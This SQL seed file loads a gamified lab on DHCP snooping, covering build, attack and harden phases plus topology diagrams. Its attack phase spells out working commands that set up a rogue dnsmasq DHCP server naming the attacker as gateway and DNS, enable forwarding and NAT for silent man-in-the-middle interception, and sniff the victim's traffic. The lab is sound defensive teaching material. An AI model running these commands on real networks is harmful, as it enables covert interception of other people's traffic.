-- ═══════════════════════════════════════════════════════════════════
-- Lab (id=37) — DHCP Snooping : full content (Vol 2 · Ch 13)
-- Second of a three-lab arc: Port Security -> DHCP Snooping -> Dynamic ARP
-- Inspection.
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Stand up a rogue DHCP server that hands out itself as the gateway — silently hijacking every new client''s traffic — then watch DHCP Snooping refuse to even let the lie leave the port.'
WHERE id = 37;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Trust Every Port Equally',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3 · Arc 2 of 3</span>
<h3>Trust Every Port Equally</h3>
<p>Port security (the last lab) locks down <em>who</em> can use a port. This lab is about something the switch has never questioned at all: <em>which port is allowed to hand out IP addresses in the first place</em>. By default, none of them are restricted — a switch treats a DHCP OFFER arriving on an access port exactly the same as one arriving on the trunk toward your real DHCP server. That's the entire vulnerability.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 550 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: DHCP lease process · rogue server risk · trust boundaries</span>
</div>

## Your arsenal (GNS3)

| Device | Role |
|---|---|
| R1 | Legitimate DHCP server for the LAN |
| SW1 | The switch — every port equally trusted right now |
| PC1 | Client getting its address the normal way |
| KALI | Plugged into an ordinary access port — same as PC1 |

Wire `R1 → SW1`, `PC1 → SW1`, `KALI → SW1` — all as ordinary access ports.

<ul class="objectives">
<li>Configure R1 as a real DHCP server for the LAN</li>
<li>Confirm PC1 leases an address normally</li>
<li>Confirm SW1 has no DHCP-specific restrictions on any port (the trap)</li>
</ul>

## Step 1 — Stand up the legitimate DHCP server (R1)

```
enable
configure terminal
ip dhcp excluded-address 10.0.0.1 10.0.0.10
ip dhcp pool LAN-POOL
 network 10.0.0.0 255.255.255.0
 default-router 10.0.0.1
 dns-server 8.8.8.8
end
```

## Step 2 — Let PC1 lease normally

```
! on PC1
release
renew
show ip
```
Confirm PC1 got an address in `10.0.0.0/24` with `10.0.0.1` as its default gateway — the real router.

## Step 3 — Confirm the trap: no port restrictions exist yet

```
show ip dhcp snooping
```
Should show DHCP snooping globally disabled — every access port, including the one Kali is sitting on, is just as capable of answering a DHCP request as R1's uplink is.

<div class="callout warn">
<p>Nothing about this switch config is unusual. This is the default state of an unconfigured LAN switch — and it means any device plugged into any port can legally offer to be everyone else's gateway.</p>
</div>

<div class="achievement">
<span class="medal">📶</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Leased Fair and Square — for now, the only DHCP server in the room is the real one</span></span>
</div>

**Next:** Phase 2 — stand up a second one, and win the race.
$md$
WHERE lab_id = 37 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Win the Race to the Gateway',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3 · Arc 2 of 3</span>
<h3>Win the Race to the Gateway</h3>
<p>DHCP is a race. When a client broadcasts DISCOVER, every server that hears it can reply with OFFER, and the client typically takes whichever OFFER arrives first. If your rogue server is closer, faster, or simply configured to respond instantly while the real one is momentarily busy, you win — and you get to decide what "default gateway" means for that client from now on.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> run every command here against your own GNS3 lab only. Rogue DHCP servers on a real network are a genuine, disruptive attack — not a demo to try anywhere else.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 750 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: rogue DHCP server · gateway hijack · transparent MITM via lease</span>
</div>

## Step 1 — Stand up the rogue server on Kali

```
sudo apt install -y dnsmasq
sudo systemctl stop systemd-resolved   # free up port 53 if needed

sudo tee /etc/dnsmasq_rogue.conf << 'EOF'
interface=eth0
dhcp-range=10.0.0.200,10.0.0.250,12h
dhcp-option=3,<KALI-IP>
dhcp-option=6,<KALI-IP>
EOF

sudo dnsmasq -C /etc/dnsmasq_rogue.conf -d
```
`dhcp-option=3` is the default gateway — you're telling every client that YOU are the router. `dhcp-option=6` does the same for DNS, so you can see lookups too.

## Step 2 — Turn on forwarding so the victim doesn't notice

The most dangerous rogue-DHCP setups stay invisible — the victim keeps working normally while every packet quietly detours through the attacker:

```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

## Step 3 — Force PC1 to ask again, and watch it fall for it

```
! on PC1
release
renew
show ip
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> If your rogue server answered first, PC1's default gateway is now Kali's address — not the real router's. Every packet PC1 sends anywhere off-subnet now passes through your machine first, silently, while PC1's connectivity looks completely normal to the user.</p>
</div>

Confirm the interception live:
```
sudo tcpdump -i eth0 -n host 10.0.0.<PC1s-new-IP>
```
Traffic from PC1 headed to "the internet" is visibly transiting your NIC.

<div class="achievement">
<span class="medal">🎣</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">New Gateway — you didn't break in, you got invited</span></span>
</div>

**Next:** Phase 3 — the switch stops trusting DHCP answers from anywhere except where they're supposed to come from.
$md$
WHERE lab_id = 37 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Only the Router Gets to Answer',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3 · Arc 2 of 3</span>
<h3>Only the Router Gets to Answer</h3>
<p>DHCP Snooping draws a hard line: exactly one port (the one toward your real DHCP server) is <strong>trusted</strong> to send DHCP server-type messages — OFFER and ACK. Every other port is <strong>untrusted</strong> by default, and untrusted ports have those message types dropped before they ever reach a client, no matter how good the rogue server's timing is. As a bonus, this same feature builds a binding table (MAC ↔ IP ↔ port ↔ VLAN) that the next lab in this arc, Dynamic ARP Inspection, uses directly.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 850 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: DHCP Snooping trust boundaries · binding table · rate limiting</span>
</div>

<ul class="objectives">
<li>Enable DHCP Snooping globally and per-VLAN</li>
<li>Trust only the uplink toward the real DHCP server</li>
<li>Rate-limit DHCP messages on untrusted ports (anti-starvation, bonus hardening)</li>
<li>Re-run the rogue-server attack → it never reaches the client</li>
</ul>

## Fix 1 — Turn on DHCP Snooping

```
configure terminal
ip dhcp snooping
ip dhcp snooping vlan 1
end
```

## Fix 2 — Trust only the real path to the DHCP server

```
configure terminal
interface FastEthernet0/24
 description UPLINK-TO-R1-DHCP-SERVER
 ip dhcp snooping trust
end
```
Every other port — including the one Kali is on — stays untrusted by default. That's the entire fix: untrusted ports may send DISCOVER and REQUEST (a client asking), but OFFER and ACK (a server answering) get silently dropped if they arrive there.

## Fix 3 (bonus) — Rate-limit untrusted ports

Ties back to the DHCP Starvation lab: this also caps how fast an untrusted port can even generate requests, blunting pool-exhaustion attacks from the same angle:

```
configure terminal
interface FastEthernet0/1
 ip dhcp snooping limit rate 10
end
```

## Re-run the attack (the fun part)

Restart the rogue server on Kali:
```
sudo dnsmasq -C /etc/dnsmasq_rogue.conf -d
```
And force PC1 to renew again:
```
! on PC1
release
renew
show ip
```

<div class="callout tip">
<p>PC1 gets its address from the real server every time now, regardless of how fast Kali's rogue OFFER arrives. Confirm it from the switch's side: <code>show ip dhcp snooping binding</code> shows PC1's real, verified MAC-IP-port pairing — and Kali's OFFER never made it into that table, because it never made it past the port at all.</p>
</div>

## Prove it to the grader

```
show ip dhcp snooping                    ! enabled, VLAN 1 covered
show ip dhcp snooping interface FastEthernet0/24  ! trusted
show ip dhcp snooping binding             ! only real leases present
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">One True Gateway — the rogue offer never even reaches the room</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE — ARC 2 OF 3</span>
<h3>DHCP Snooping — cleared</h3>
<p>You stood up a rogue DHCP server, won the race, and quietly became a client's default gateway — total invisible interception. Then you drew a hard trust boundary at the switch: only the real server's port may answer, and everything else is dropped on sight. You also just built the binding table the final lab in this arc is about to use directly.</p>
<p><strong>Total: 2150 XP</strong> · Next target: <code>Dynamic ARP Inspection</code> — where that same binding table is turned against ARP spoofing.</p>
</div>
$md$
WHERE lab_id = 37 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  37,
  $svg$<svg viewBox="0 0 340 150" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <rect x="130" y="55" width="90" height="34" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="175" y="77" text-anchor="middle" font-size="10" fill="#14161a" font-weight="600">SW1</text>
  <rect x="10" y="10" width="90" height="30" rx="6" fill="#fff" stroke="#0d7050" stroke-width="1.5"/>
  <text x="55" y="30" text-anchor="middle" font-size="9" fill="#0d7050" font-weight="600">R1 (real DHCP)</text>
  <rect x="10" y="100" width="90" height="30" rx="6" fill="#fff" stroke="#1d4fc7" stroke-width="1.5"/>
  <text x="55" y="120" text-anchor="middle" font-size="9" fill="#1d4fc7" font-weight="600">PC1 (client)</text>
  <rect x="240" y="55" width="90" height="34" rx="6" fill="#fff" stroke="#c02a30" stroke-width="1.6"/>
  <text x="285" y="77" text-anchor="middle" font-size="9" fill="#c02a30" font-weight="600">KALI (rogue)</text>
  <line x1="55" y1="40" x2="150" y2="65" stroke="#0d7050" stroke-width="2"/>
  <line x1="55" y1="100" x2="150" y2="80" stroke="#1d4fc7" stroke-width="2"/>
  <line x1="240" y1="72" x2="220" y2="72" stroke="#c02a30" stroke-width="2" stroke-dasharray="4 4"/>
</svg>$svg$,
  $svg$<svg viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <rect x="270" y="90" width="160" height="56" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.8"/>
  <text x="350" y="113" text-anchor="middle" font-size="13" fill="#14161a" font-weight="700">SW1</text>
  <text x="350" y="130" text-anchor="middle" font-size="9" fill="#6b7480">DHCP snooping · trust boundary</text>
  <rect x="40" y="20" width="170" height="50" rx="9" fill="#fff" stroke="#0d7050" stroke-width="1.8"/>
  <text x="125" y="42" text-anchor="middle" font-size="12" fill="#0d7050" font-weight="600">R1 · real DHCP</text>
  <text x="125" y="58" text-anchor="middle" font-size="8" fill="#6b7480">Fa0/24 · TRUSTED</text>
  <rect x="40" y="190" width="150" height="50" rx="9" fill="#fff" stroke="#1d4fc7" stroke-width="1.8"/>
  <text x="115" y="212" text-anchor="middle" font-size="12" fill="#1d4fc7" font-weight="600">PC1 · client</text>
  <text x="115" y="228" text-anchor="middle" font-size="8" fill="#6b7480">gets the real lease</text>
  <rect x="490" y="90" width="180" height="56" rx="9" fill="#fff" stroke="#c02a30" stroke-width="1.8"/>
  <text x="580" y="113" text-anchor="middle" font-size="12" fill="#c02a30" font-weight="600">KALI · rogue DHCP</text>
  <text x="580" y="129" text-anchor="middle" font-size="8" fill="#6b7480">OFFER dropped — untrusted port</text>
  <line x1="125" y1="70" x2="290" y2="108" stroke="#0d7050" stroke-width="2.5"/>
  <line x1="115" y1="190" x2="290" y2="130" stroke="#1d4fc7" stroke-width="2.5"/>
  <line x1="490" y1="118" x2="430" y2="118" stroke="#c02a30" stroke-width="2.5" stroke-dasharray="6 5"/>
  <text x="500" y="200" font-size="10" fill="#6b7480">→ Arc continues: Dynamic ARP Inspection</text>
</svg>$svg$,
  $json$["Real DHCP server (trusted port)", "Client (real lease)", "Rogue DHCP server (untrusted port, blocked)"]$json$::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
